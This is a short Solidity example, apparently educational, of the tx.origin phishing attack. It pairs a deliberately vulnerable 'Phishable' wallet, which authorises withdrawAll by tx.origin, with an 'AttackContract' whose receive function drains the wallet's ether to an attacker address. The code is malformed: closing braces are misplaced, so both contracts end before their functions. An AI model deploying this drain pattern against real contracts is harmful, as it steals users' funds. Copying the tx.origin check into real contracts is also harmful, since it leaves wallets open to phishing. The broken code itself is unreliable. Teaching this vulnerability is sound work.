// TX.ORIGIN Attack

// VULNERABLE CONTRACT

contract Phishable {
address public owner;
}
constructor (address _owner) {
owner = _owner;
}
receive() external payable{
// collect ether
}
function withdrawAll(address payable _recipient) public {
require(tx.origin == owner);
_recipient.transfer(address(this).balance);
}

// Attacker Side

import "./Problem.sol";
contract AttackContract {
Phishable phishableContract;
address payable attacker; // The attackers address to receive funds.
constructor (Phishable _phishableContract, address payable _attackerAddress) {
phishableContract = _phishableContract;
attacker = _attackerAddress;
}
}
receive() external payable {
phishableContract.withdrawAll(attacker);
}
